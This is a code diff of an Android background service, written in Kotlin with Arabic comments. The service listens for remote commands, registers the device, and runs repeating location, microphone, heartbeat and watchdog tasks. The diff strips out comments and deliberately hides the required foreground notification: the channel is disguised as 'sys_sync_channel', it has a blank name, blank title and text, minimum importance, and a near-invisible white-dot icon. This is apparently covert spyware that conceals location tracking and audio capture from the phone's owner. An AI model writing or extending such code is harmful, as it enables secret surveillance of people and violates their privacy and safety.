@@ -34,13 +34,11 @@ class BackgroundService : Service() {
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
         try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
 
-        // Sync
         scope.launch {
             delay(3_000L)
             try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
         }
 
-        // Heartbeat
         scope.launch {
             while (running) {
                 try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
@@ -48,7 +46,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // Location
         scope.launch {
             while (running) {
                 try {
@@ -66,7 +63,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // Cleanup
         scope.launch {
             while (running) {
                 try {
@@ -80,7 +76,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // Mic
         scope.launch {
             while (running) {
                 try {
@@ -99,7 +94,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // Watchdog
         scope.launch {
             while (running) {
                 delay(60_000L)
@@ -151,7 +145,7 @@ class BackgroundService : Service() {
     }
 
     // ═══════════════════════════════════════════
-    //  إشعار رقيق جداً
+    //  إشعار رفيع جداً — أيقونة بيضاء بدون شكل
     // ═══════════════════════════════════════════
     private fun startForegroundCompat() {
         val channelId = "sys_sync_channel"
@@ -161,7 +155,7 @@ class BackgroundService : Service() {
             if (nm.getNotificationChannel(channelId) == null) {
                 val ch = NotificationChannel(
                     channelId,
-                    " ",
+                    " ",                                          // اسم فارغ
                     NotificationManager.IMPORTANCE_MIN
                 )
                 ch.setSound(null, null)
@@ -173,8 +167,9 @@ class BackgroundService : Service() {
             }
         }
 
+        // ⭐ أيقونة بيضاء بدون شكل (نقطة صغيرة)
         val notif: Notification = NotificationCompat.Builder(this, channelId)
-            .setSmallIcon(android.R.drawable.screen_background_light_transparent)
+            .setSmallIcon(R.drawable.ic_white_dot)      // ← نقطة بيضاء
             .setContentTitle(" ")
             .setContentText(" ")
             .setOngoing(true)
